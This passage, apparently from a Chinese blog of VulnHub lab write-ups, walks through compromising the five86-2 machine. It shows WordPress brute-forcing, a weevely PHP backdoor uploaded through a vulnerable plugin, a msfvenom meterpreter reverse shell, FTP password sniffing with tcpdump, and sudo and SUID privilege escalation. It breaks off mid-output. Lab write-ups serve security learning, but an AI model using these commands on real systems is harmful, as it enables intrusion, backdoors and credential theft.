&#x2F;usr&#x2F;games&#x2F;freesweep</span><br><span class="line">lrwxrwxrwx 1 moss moss    15 Jan  1 03:23 hunt -&gt; &#x2F;usr&#x2F;games&#x2F;hunt</span><br><span class="line">lrwxrwxrwx 1 moss moss    20 Jan  1 03:22 ninvaders -&gt; &#x2F;usr&#x2F;games&#x2F;ninvaders</span><br><span class="line">lrwxrwxrwx 1 moss moss    17 Jan  1 03:19 nsnake -&gt; &#x2F;usr&#x2F;games&#x2F;nsnake</span><br><span class="line">lrwxrwxrwx 1 moss moss    25 Jan  1 03:21 pacman4console -&gt; &#x2F;usr&#x2F;games&#x2F;pacman4console</span><br><span class="line">lrwxrwxrwx 1 moss moss    17 Jan  1 03:22 petris -&gt; &#x2F;usr&#x2F;games&#x2F;petris</span><br><span class="line">lrwxrwxrwx 1 moss moss    16 Jan  1 03:22 snake -&gt; &#x2F;usr&#x2F;games&#x2F;snake</span><br><span class="line">lrwxrwxrwx 1 moss moss    17 Jan  1 03:20 sudoku -&gt; &#x2F;usr&#x2F;games&#x2F;sudoku</span><br><span class="line">-rwsr-xr-x 1 root root 16824 Jan  1 03:52 upyourgame</span><br><span class="line">lrwxrwxrwx 1 moss moss    16 Jan  1 03:22 worms -&gt; &#x2F;usr&#x2F;games&#x2F;worms</span><br></pre></td></tr></table></figure><p>执行之后任意输入五次即可进入root权限下的sh</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;upyourgame </span><br><span class="line">Would you like to play a game? 1</span><br><span class="line"></span><br><span class="line">Could you please repeat that? 1</span><br><span class="line"></span><br><span class="line">Nope, you&#39;ll need to enter that again. 1</span><br><span class="line"></span><br><span class="line">You entered: No.  Is this correct? 1</span><br><span class="line"></span><br><span class="line">We appear to have a problem?  Do we have a problem? 1</span><br><span class="line"></span><br><span class="line">Made in Britain.</span><br><span class="line"># id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;1001(moss) groups&#x3D;1001(moss)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>手动导入MSF模块</p></blockquote><p>searchsploit命令找到了存储于本地的MSF漏洞利用模块，其路径为</p><p><code>/usr/share/exploitdb/exploits/linux/webapps/47772.rb</code></p><p>执行如下命令即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;webapps&#x2F;47772.rb &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;exploits&#x2F;linux&#x2F;http&#x2F;opennetadmin_ping_cmd_injection.rb</span><br><span class="line">chmod 644 opennetadmin_ping_cmd_injection.rb.rb</span><br></pre></td></tr></table></figure><p>之后在MSF中执行<code>reload_all</code></p><blockquote><p>cp提权</p></blockquote><p>之前看到有文章大概列举了一下SUID提权的几个指令，其中有cp命令，但是没有文章没有列举出详细的操作过程<br />个人想法是用root权限的cp命令去覆盖掉passwd文件，这次靶机渗透学到了用cp命令去写入ssh信任秘钥来进行水平提权<br />大概不能将同样的套路用于垂直提权至root，因为一般ssh默认禁止掉了root登入</p><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/kuaile1314/p/12252563.html">WP</a></p></blockquote><hr /><h1 id="five86-2"><a class="markdownIt-Anchor" href="#five86-2"></a> <a href="https://www.vulnhub.com/entry/five86-2,418/">five86-2</a></h1><p><code>2020/03/15 21:54:23</code></p><h2 id="端口扫描-10"><a class="markdownIt-Anchor" href="#端口扫描-10"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -Pn -T5 -sV -A -n -v 192.168.31.209</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.51</span><br><span class="line">Host is up (0.00044s latency).</span><br><span class="line">Not shown: 65532 filtered ports</span><br><span class="line">PORT   STATE  SERVICE  VERSION</span><br><span class="line">21&#x2F;tcp open   ftp      ProFTPD 1.3.5e</span><br><span class="line">80&#x2F;tcp open   ssl&#x2F;http Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http:&#x2F;&#x2F;192.168.31.51&#x2F;</span><br><span class="line">MAC Address: 08:00:27:29:D0:EB (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose|storage-misc|WAP|media device</span><br><span class="line">Running (JUST GUESSING): Linux 2.6.X|3.X|4.X (95%), HP embedded (91%), Netgear RAIDiator 4.X (91%), Ubiquiti AirOS 5.X (90%), ZyXEL embedded (90%), Ubiquiti embedded (90%)</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:2.6 cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;h:hp:p2000_g3 cpe:&#x2F;o:netgear:raidiator:4.2.24 cpe:&#x2F;o:ubnt:airos:5.2.6 cpe:&#x2F;o:linux:linux_kernel:2.6.32 cpe:&#x2F;h:ubnt:airmax_nanostation</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 - 3.13 (95%), Linux 2.6.22 - 2.6.36 (93%), Linux 2.6.32 - 2.6.39 (93%), Linux 2.6.37 (93%), Linux 3.10 - 4.11 (93%), Linux 2.6.39 (93%), Linux 2.6.32 (92%), Linux 3.2 - 4.9 (92%), Linux 2.6.32 - 3.10 (92%), HP P2000 G3 NAS device (91%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Uptime guess: 32.468 days (since Tue Feb 11 09:55:14 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;263 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Unix</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-10"><a class="markdownIt-Anchor" href="#web路径枚举-10"></a> Web路径枚举</h2><p><code>dirb http://192.168.31.51/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.51&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.51&#x2F;index.php (CODE:301|SIZE:0)                                           </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.51&#x2F;server-status (CODE:403|SIZE:278)                                     </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.51&#x2F;wp-admin&#x2F;                                                </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.51&#x2F;wp-content&#x2F;                                              </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.51&#x2F;wp-includes&#x2F;                                             </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.51&#x2F;xmlrpc.php (CODE:405|SIZE:42)</span><br></pre></td></tr></table></figure><ul><li>80端口上仅存在Wordpress服务框架</li></ul><h2 id="漏洞利用-10"><a class="markdownIt-Anchor" href="#漏洞利用-10"></a> 漏洞利用</h2><ul><li>未找到FTP服务版本相关漏洞</li><li>Wordpress深入信息收集</li><li>未挖掘出有漏洞的插件或主题</li><li>用户枚举</li></ul><p><code>wpscan --url http://192.168.31.51/ -e u</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] barney</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] gillian</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] peter</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] stephen</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>构造用户字典文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat user</span><br><span class="line"></span><br><span class="line">barney</span><br><span class="line">admin</span><br><span class="line">gillian</span><br><span class="line">peter</span><br><span class="line">stephen</span><br></pre></td></tr></table></figure><p>尝试进行账户爆破</p><p><code>wpscan --url http://192.168.31.51/ -U user -P /usr/share/wordlists/rockyou.txt</code></p><p>得到两个账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">barney spooky1</span><br><span class="line">stephen apollo1</span><br></pre></td></tr></table></figure><p>在<code>/wp-login.php</code>登入</p><p>登入之后在<code>Plugins</code>面板看到存在插件</p><p><code>Insert or Embed Articulate Content into WordPress Trial</code></p><p>搜索相关信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Insert or Embed Articulate Content into WordPress</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                             |  Path</span><br><span class="line">                                                                                           | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">WordPress Plugin Insert or Embed Articulate Content into WordPress - Remote Code Execution | exploits&#x2F;php&#x2F;webapps&#x2F;46981.txt</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure><p>再查看漏洞的具体利用步骤<br /><code>cat /usr/share/exploitdb/exploits/php/webapps/46981.txt</code></p><ol><li>使用weevely构造php后门并创建一个文件index.html，压缩成zip文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">weevely generate pass &gt; shell.php</span><br><span class="line">echo &gt; index.html</span><br><span class="line">zip poc.zip index.html shell.php</span><br></pre></td></tr></table></figure><ol start="2"><li>登入wordpress(已登入)</li><li>依次点击<code>Posts -&gt; Add New -&gt; Add block -&gt; e-Learning -&gt; UPLOAD -&gt; CHOOES YOUR ZIP FILE -&gt; poc.zip -&gt; UPLOAD! -&gt; Insert As: iFrame -&gt; INSERT</code></li><li>此时会显示出index.html的路径，复制之后将index.html改为shell.php即为后门路径</li><li>连接后门<br /><code>weevely http://five86-2/wp-content/uploads/articulate_uploads/poc/shell.php pass</code></li></ol><h2 id="权限提升-10"><a class="markdownIt-Anchor" href="#权限提升-10"></a> 权限提升</h2><p>查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux five86-2 5.3.0-26-generic #28-Ubuntu SMP Wed Dec 18 05:37:46 UTC 2019 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure><p>构造meterpreter后门程序</p><p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9990 -f elf &gt; msf.elf</code></p><p>在MSF中开启监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp </span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 9990</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>在weevely中上传后门程序并启动(需要填写绝对路径)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file_upload &#x2F;root&#x2F;software&#x2F;msf.elf &#x2F;var&#x2F;www&#x2F;html&#x2F;msf.elf</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">chmod +x msf.elf</span><br><span class="line">.&#x2F;msf.elf</span><br></pre></td></tr></table></figure><p>在meterpreter的shell中获取tty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>查看文件<code>/etc/passwd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uuidd:x:106:111::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:107:112::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">landscape:x:108:114::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:109:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:110:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lxd:x:998:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">mysql:x:111:116:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">barney:x:1001:1001:Barney Sumner:&#x2F;home&#x2F;barney:&#x2F;bin&#x2F;bash</span><br><span class="line">stephen:x:1002:1002:Stephen Morris:&#x2F;home&#x2F;stephen:&#x2F;bin&#x2F;bash</span><br><span class="line">peter:x:1003:1003:Peter Hook:&#x2F;home&#x2F;peter:&#x2F;bin&#x2F;bash</span><br><span class="line">gillian:x:1004:1004:Gillian Gilbert:&#x2F;home&#x2F;gillian:&#x2F;bin&#x2F;bash</span><br><span class="line">richard:x:1005:1005:Richard Starkey:&#x2F;home&#x2F;richard:&#x2F;bin&#x2F;bash</span><br><span class="line">paul:x:1006:1006:Paul McCartney:&#x2F;home&#x2F;paul:&#x2F;bin&#x2F;bash</span><br><span class="line">john:x:1007:1007:John Lennon:&#x2F;home&#x2F;john:&#x2F;bin&#x2F;bash</span><br><span class="line">george:x:1008:1008:George Harrison:&#x2F;home&#x2F;george:&#x2F;bin&#x2F;bash</span><br><span class="line">dnsmasq:x:114:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br></pre></td></tr></table></figure><p>存在用户<code>barney</code>和<code>stephen</code><br />尝试套用Wordpress账户的密码<br />可以登入账户stephen</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su stephen</span><br><span class="line">apollo1</span><br></pre></td></tr></table></figure><p>查看当前用户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">uid&#x3D;1002(stephen) gid&#x3D;1002(stephen) groups&#x3D;1002(stephen),1009(pcap)</span><br></pre></td></tr></table></figure><p>查看特权命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getcap -r &#x2F; 2&gt; &#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;ping &#x3D; cap_net_raw+ep</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils &#x3D; cap_net_raw+ep</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;mtr-packet &#x3D; cap_net_raw+ep</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;gstreamer1.0&#x2F;gstreamer-1.0&#x2F;gst-ptp-helper &#x3D; cap_net_bind_service,cap_net_admin+ep</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;tcpdump &#x3D; cap_net_admin,cap_net_raw+eip</span><br></pre></td></tr></table></figure><p>发现存在tcpdump程序，可以用于监听流量</p><p>查看程序tcpdump所有者与所有组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;usr&#x2F;sbin&#x2F;tcpdump</span><br><span class="line">-rwxr-x--- 1 root pcap 1044232 Oct 11 18:48 &#x2F;usr&#x2F;sbin&#x2F;tcpdump</span><br></pre></td></tr></table></figure><p>而用户stephen也属于pcap组，可以使用tcpdump程序</p><p>查看系统关于ftp的进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep ftp</span><br><span class="line"></span><br><span class="line">systemd+  1251  0.0  0.3 119976  1876 pts&#x2F;0    Ss+  10:21   0:01 proftpd: (accepting connections)</span><br><span class="line">paul      2329  0.0  0.1   2600   788 ?        Ss   12:00   0:00 &#x2F;bin&#x2F;sh -c &#x2F;home&#x2F;paul&#x2F;ftp_upload.sh &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1</span><br><span class="line">paul      2330  0.0  0.1   2600   788 ?        S    12:00   0:00 &#x2F;bin&#x2F;sh &#x2F;home&#x2F;paul&#x2F;ftp_upload.sh</span><br><span class="line">paul      2331  0.0  0.4   3224  2124 ?        S    12:00   0:00 ftp -n 172.18.0.10</span><br><span class="line">1000      2332  0.0  1.2 133072  6124 pts&#x2F;0    S+   12:00   0:00 proftpd: paul - 172.18.0.1: STOR file.txt</span><br><span class="line">stephen   2335  0.0  0.1   6496   856 pts&#x2F;0    S+   12:01   0:00 grep ftp</span><br></pre></td></tr></table></figure><p>用户paul正在执行脚本<code>ftp_upload.sh</code>和命令<code>ftp -n 172.18.0.10</code><br />而FTP是明文传输，可以通过监听流量来获取一些信息</p><p>查看网络接口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -D</span><br><span class="line"></span><br><span class="line">1.br-eca3858d86bf [Up, Running]</span><br><span class="line">2.eth0 [Up, Running]</span><br><span class="line">3.vethf7d5e2c [Up, Running]</span><br><span class="line">4.lo [Up, Running, Loopback]</span><br><span class="line">5.any (Pseudo-device that captures on all interfaces) [Up, Running]</span><br><span class="line">6.docker0 [Up]</span><br><span class="line">7.nflog (Linux netfilter log (NFLOG) interface) [none]</span><br><span class="line">8.nfqueue (Linux netfilter queue (NFQUEUE) interface) [none]</span><br></pre></td></tr></table></figure><p>监听流量一分钟</p><p><code>timeout 60 tcpdump -i vethf7d5e2c -w /tmp/cap.pcap</code></p><p>查看流量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -r &#x2F;tmp&#x2F;cap.pcap</span><br><span class="line"></span><br><span class="line">12:12:05.337100 IP 172.18.0.10.ftp &gt; five86-2.42120: Flags [P.], seq 1:58, ack 1, win 1019, options [nop,nop,TS val 1753001473 ecr 956298429], length 57: FTP: 220 ProFTPD 1.3.5e Server (Debian) [::ffff:172.18.0.10]</span><br><span class="line">12:12:05.337126 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [.], ack 58, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 0</span><br><span class="line">12:12:05.337305 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [P.], seq 1:12, ack 58, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 11: FTP: USER paul</span><br><span class="line">12:12:05.337311 IP 172.18.0.10.ftp &gt; five86-2.42120: Flags [.], ack 12, win 1019, options [nop,nop,TS val 1753001473 ecr 956302705], length 0</span><br><span class="line">12:12:05.337522 IP 172.18.0.10.ftp &gt; five86-2.42120: Flags [P.], seq 58:90, ack 12, win 1019, options [nop,nop,TS val 1753001473 ecr 956302705], length 32: FTP: 331 Password required for paul</span><br><span class="line">12:12:05.337610 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [.], ack 90, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 0</span><br><span class="line">12:12:05.337627 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [P.], seq 12:33, ack 90, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 21: FTP: PASS esomepasswford</span><br></pre></td></tr></table></figure><p>得到账户<code>paul:esomepasswford</code></p><p>切换至账户paul</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su paul</span><br><span class="line">esomepasswford</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for paul on five86-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User paul may run the following commands on five86-2:</span><br><span class="line">    (peter) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;service</span><br></pre></td></tr></table></figure><p>可以以用户peter的权限去执行<code>/usr/sbin/service</code><br />即可以通过该命令切换至账户peter<br /><code>sudo -u peter /usr/sbin/service ../../bin/bash</code></p><p>查看该用户sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for peter on five86-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    